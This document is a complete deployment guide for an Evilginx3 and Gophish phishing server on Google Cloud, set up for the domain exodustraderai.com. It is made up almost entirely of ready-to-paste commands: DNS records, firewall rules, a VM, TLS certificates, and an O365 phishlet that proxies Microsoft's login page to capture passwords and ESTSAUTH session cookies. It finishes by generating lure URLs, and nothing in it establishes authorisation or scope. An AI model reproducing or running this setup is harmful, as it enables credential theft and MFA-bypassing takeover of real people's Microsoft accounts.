# EvilGophish + Frameless-BitB - Complete Google Cloud Shell Deployment Guide

**Domain**: exodustraderai.com
**DNS Provider**: Google Cloud DNS (NO Cloudflare)
**Deployment Method**: 100% Google Cloud Shell (Browser-based)

---

## PART 1: DOMAIN NAMESERVER CONFIGURATION

### What You Need to Update at Your Domain Registrar

After we set up Google Cloud DNS, you'll need to update your domain's nameservers at **your domain registrar** (where you bought exodustraderai.com).

**You'll replace your current nameservers with Google Cloud DNS nameservers:**
- `ns-cloud-a1.googledomains.com`
- `ns-cloud-a2.googledomains.com`
- `ns-cloud-a3.googledomains.com`
- `ns-cloud-a4.googledomains.com`

**Where to update**: Log into your domain registrar (GoDaddy, Namecheap, Google Domains, etc.) and find "Nameservers" or "DNS Settings" section.

---

## PART 2: GOOGLE CLOUD SHELL SETUP

### Step 1: Open Google Cloud Shell

1. Go to: https://console.cloud.google.com
2. Click the **Cloud Shell icon** (terminal icon) in the top-right corner
3. Wait for Cloud Shell to initialize (takes ~10 seconds)

### Step 2: Create New GCP Project

```bash
# Set your project ID (must be globally unique)
export PROJECT_ID="evilgophish-prod-$(date +%s)"

# Create the project
gcloud projects create $PROJECT_ID --name="EvilGophish Production"

# Set as active project
gcloud config set project $PROJECT_ID

# Link billing account (you must have billing enabled)
# List your billing accounts first
gcloud billing accounts list

# Copy the ACCOUNT_ID from the output above, then run:
# gcloud billing projects link $PROJECT_ID --billing-account=ACCOUNT_ID
```

**IMPORTANT**: You MUST link a billing account. Copy the `ACCOUNT_ID` from the list command and run the link command.

### Step 3: Enable Required APIs

```bash
gcloud services enable compute.googleapis.com
gcloud services enable dns.googleapis.com
gcloud services enable cloudresourcemanager.googleapis.com
```

Wait ~30 seconds for APIs to be fully enabled.

---

## PART 3: GOOGLE CLOUD DNS SETUP

### Step 4: Create DNS Zone

```bash
# Create managed DNS zone for your domain
gcloud dns managed-zones create exodustraderai-zone \
    --dns-name="exodustraderai.com." \
    --description="DNS zone for EvilGophish" \
    --visibility=public

# Get the nameservers (YOU NEED THESE FOR YOUR DOMAIN REGISTRAR)
gcloud dns managed-zones describe exodustraderai-zone --format="get(nameServers)"
```

**COPY THE NAMESERVERS OUTPUT** - You'll update these at your domain registrar.

The output will look like:
```
ns-cloud-a1.googledomains.com.
ns-cloud-a2.googledomains.com.
ns-cloud-a3.googledomains.com.
ns-cloud-a4.googledomains.com.
```

### Step 5: Reserve Static External IP

```bash
# Reserve a static external IP
gcloud compute addresses create evilgophish-ip \
    --region=us-central1 \
    --network-tier=PREMIUM

# Get the IP address (YOU NEED THIS)
export EXTERNAL_IP=$(gcloud compute addresses describe evilgophish-ip --region=us-central1 --format="get(address)")

# Display the IP
echo "Your External IP: $EXTERNAL_IP"
```

**COPY THE EXTERNAL IP** - You'll use this in DNS records.

---

## PART 4: CREATE DNS RECORDS

### Step 6: Add DNS A Records

We'll create 6 subdomains pointing to your external IP:

```bash
# Start a transaction
gcloud dns record-sets transaction start --zone=exodustraderai-zone

# Add A records for all 6 subdomains
gcloud dns record-sets transaction add $EXTERNAL_IP \
    --name=login.exodustraderai.com. \
    --ttl=300 \
    --type=A \
    --zone=exodustraderai-zone

gcloud dns record-sets transaction add $EXTERNAL_IP \
    --name=www.exodustraderai.com. \
    --ttl=300 \
    --type=A \
    --zone=exodustraderai-zone

gcloud dns record-sets transaction add $EXTERNAL_IP \
    --name=portal.exodustraderai.com. \
    --ttl=300 \
    --type=A \
    --zone=exodustraderai-zone

gcloud dns record-sets transaction add $EXTERNAL_IP \
    --name=admin.exodustraderai.com. \
    --ttl=300 \
    --type=A \
    --zone=exodustraderai-zone

gcloud dns record-sets transaction add $EXTERNAL_IP \
    --name=feed.exodustraderai.com. \
    --ttl=300 \
    --type=A \
    --zone=exodustraderai-zone

gcloud dns record-sets transaction add $EXTERNAL_IP \
    --name=api.exodustraderai.com. \
    --ttl=300 \
    --type=A \
    --zone=exodustraderai-zone

# Execute the transaction
gcloud dns record-sets transaction execute --zone=exodustraderai-zone

# Verify records were created
gcloud dns record-sets list --zone=exodustraderai-zone
```

---

## PART 5: UPDATE DOMAIN NAMESERVERS

**ACTION REQUIRED ON YOUR DOMAIN REGISTRAR:**

1. Log into your domain registrar (where you bought exodustraderai.com)
2. Find the domain management section
3. Look for "Nameservers", "DNS Settings", or "Name Server Configuration"
4. Switch from default/current nameservers to **Custom Nameservers**
5. Enter the 4 Google Cloud DNS nameservers from Step 4:
   - `ns-cloud-a1.googledomains.com`
   - `ns-cloud-a2.googledomains.com`
   - `ns-cloud-a3.googledomains.com`
   - `ns-cloud-a4.googledomains.com`
6. Save changes
7. Wait 5-10 minutes for propagation

**Verify DNS is working:**

```bash
# Check if DNS has propagated (run this after updating nameservers)
dig login.exodustraderai.com +short
# Should return your external IP
```

---

## PART 6: CREATE FIREWALL RULES

### Step 7: Configure Firewall

```bash
# Create firewall rule for HTTP, HTTPS, DNS, SSH, and Gophish
gcloud compute firewall-rules create evilgophish-allow-all \
    --direction=INGRESS \
    --priority=1000 \
    --network=default \
    --action=ALLOW \
    --rules=tcp:22,tcp:53,udp:53,tcp:80,tcp:443,tcp:3333 \
    --source-ranges=0.0.0.0/0 \
    --target-tags=evilgophish-server

# Verify firewall rule
gcloud compute firewall-rules describe evilgophish-allow-all
```

---

## PART 7: CREATE VM INSTANCE

### Step 8: Deploy VM

```bash
# Create the VM with external IP attached
gcloud compute instances create evilgophish-server \
    --zone=us-central1-c \
    --machine-type=e2-standard-2 \
    --image-family=ubuntu-2204-lts \
    --image-project=ubuntu-os-cloud \
    --boot-disk-size=50GB \
    --boot-disk-type=pd-standard \
    --tags=evilgophish-server \
    --address=evilgophish-ip \
    --metadata=startup-script='#!/bin/bash
apt-get update
apt-get install -y git curl wget build-essential'

# Wait 60 seconds for VM to boot
sleep 60

# Verify VM is running
gcloud compute instances describe evilgophish-server --zone=us-central1-c
```

---

## PART 8: SSH INTO VM AND INSTALL DEPENDENCIES

### Step 9: Connect to VM

```bash
# SSH into the VM from Cloud Shell
gcloud compute ssh evilgophish-server --zone=us-central1-c
```

Once connected, you'll be inside the VM. Run the following commands:

### Step 10: Install Go

```bash
# Become root
sudo su -

# Install Go 1.21
cd /tmp
wget https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
rm -rf /usr/local/go
tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz

# Set Go environment variables
export PATH=$PATH:/usr/local/go/bin
echo 'export PATH=$PATH:/usr/local/go/bin' >> /root/.bashrc
echo 'export GOPATH=/root/go' >> /root/.bashrc
source /root/.bashrc

# Verify Go installation
go version
```

### Step 11: Install Evilginx3

```bash
# Create directory structure
mkdir -p /opt/security-testing/evilgophish
cd /opt/security-testing/evilgophish

# Clone Evilginx3
git clone https://github.com/kgretzky/evilginx2.git evilginx3
cd evilginx3

# Build Evilginx3
make

# Verify binary exists
ls -la /opt/security-testing/evilgophish/evilginx3/build/evilginx
```

### Step 12: Install Gophish

```bash
# Download Gophish
cd /opt/security-testing/evilgophish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip -d gophish
cd gophish
chmod +x gophish

# Verify Gophish binary
ls -la /opt/security-testing/evilgophish/gophish/gophish
```

### Step 13: Install Frameless-BitB (Optional - may require auth)

```bash
# Try to clone Frameless-BitB (skip if it requires authentication)
cd /opt/security-testing/evilgophish
git clone https://github.com/mrd0x/Frameless-BitB.git frameless-bitb || echo "Frameless-BitB clone failed - continuing without it"
```

### Step 14: Install Certbot for SSL

```bash
# Install Certbot
apt-get update
apt-get install -y certbot

# Stop any service using port 80
systemctl stop apache2 2>/dev/null || true
systemctl disable apache2 2>/dev/null || true

# Disable systemd-resolved (conflicts with port 53)
systemctl stop systemd-resolved
systemctl disable systemd-resolved

# Set static DNS
echo "nameserver 8.8.8.8" > /etc/resolv.conf
echo "nameserver 8.8.4.4" >> /etc/resolv.conf
chattr +i /etc/resolv.conf
```

### Step 15: Generate SSL Certificates

```bash
# Generate certificates for all 6 subdomains
certbot certonly --standalone --preferred-challenges http \
    -d login.exodustraderai.com \
    -d www.exodustraderai.com \
    -d portal.exodustraderai.com \
    -d admin.exodustraderai.com \
    -d feed.exodustraderai.com \
    -d api.exodustraderai.com \
    --non-interactive --agree-tos \
    -m admin@exodustraderai.com
```

**Enter your real email when prompted.**

---

## PART 9: CONFIGURE EVILGINX3

### Step 16: Create O365 Phishlet

```bash
# Navigate to phishlets directory
cd /opt/security-testing/evilgophish/evilginx3/phishlets

# Create O365 phishlet
cat > o365.yaml << 'PHISHLET_EOF'
name: 'o365'
author: '@kgretzky'
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false}

sub_filters:
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login.microsoftonline.com', replace: 'login.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'office.com', search: 'www.office.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json']}

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.microsoftonline.com'
  path: '/'
PHISHLET_EOF

# Verify file was created
ls -la /opt/security-testing/evilgophish/evilginx3/phishlets/o365.yaml
cat /opt/security-testing/evilgophish/evilginx3/phishlets/o365.yaml
```

### Step 17: Configure Evilginx3

```bash
# Create config directory
mkdir -p /root/.evilginx

# Start Evilginx3 interactively
cd /opt/security-testing/evilgophish/evilginx3
./build/evilginx -p ./phishlets
```

**Inside Evilginx3 console, run these commands:**

```
config domain exodustraderai.com
config ipv4 external <YOUR_EXTERNAL_IP>

phishlets hostname o365 login.exodustraderai.com

crt /etc/letsencrypt/live/login.exodustraderai.com/fullchain.pem /etc/letsencrypt/live/login.exodustraderai.com/privkey.pem

phishlets enable o365

lures create o365
lures get-url 0
```

**Replace `<YOUR_EXTERNAL_IP>` with the IP from Step 5.**

---

## PART 10: CONFIGURE GOPHISH

### Step 18: Set Up Gophish

Open a NEW Cloud Shell tab (click + icon), then SSH again:

```bash
gcloud compute ssh evilgophish-server --zone=us-central1-c
sudo su -
```

Edit Gophish config:

```bash
cd /opt/security-testing/evilgophish/gophish

# Edit config.json to listen on all interfaces
cat > config.json << 'GOPHISH_CONFIG'
{
  "admin_server": {
    "listen_url": "0.0.0.0:3333",
    "use_tls": true,
    "cert_path": "gophish_admin.crt",
    "key_path": "gophish_admin.key"
  },
  "phish_server": {
    "listen_url": "0.0.0.0:80",
    "use_tls": false
  },
  "db_name": "sqlite3",
  "db_path": "gophish.db",
  "migrations_prefix": "db/db_"
}
GOPHISH_CONFIG

# Start Gophish
./gophish
```

**Copy the initial password from the output.**

---

## PART 11: ACCESS AND TEST

### Access Gophish Admin Panel

**URL**: `https://<YOUR_EXTERNAL_IP>:3333`

Username: `admin`
Password: (from Gophish startup output)

### Test Phishing Page

**URL**: `https://login.exodustraderai.com` (use the lure URL from Evilginx3)

---

## TROUBLESHOOTING

### DNS Not Resolving
```bash
# Check DNS propagation
dig login.exodustraderai.com +short
dig @8.8.8.8 login.exodustraderai.com +short
```

### SSL Certificate Errors
```bash
# Verify certificates exist
ls -la /etc/letsencrypt/live/login.exodustraderai.com/

# Test certificate renewal
certbot renew --dry-run
```

### Port Conflicts
```bash
# Check what's using ports
netstat -tlnp | grep -E ':(53|80|443|3333)'

# Kill processes if needed
fuser -k 53/tcp
fuser -k 80/tcp
fuser -k 443/tcp
```

### Evilginx3 Not Starting
```bash
# Check binary exists
ls -la /opt/security-testing/evilgophish/evilginx3/build/evilginx

# Run with verbose output
cd /opt/security-testing/evilgophish/evilginx3
./build/evilginx -p ./phishlets -developer
```

---

## SUMMARY OF WHAT YOU NEED TO DO MANUALLY

1. **Create billing-linked GCP project** (Step 2)
2. **Update domain nameservers** at your registrar (Part 5) - use the nameservers from Step 4
3. **Enter email for SSL certificates** (Step 15)
4. **Configure Evilginx3 with your external IP** (Step 17)

Everything else is copy-paste commands in Cloud Shell.
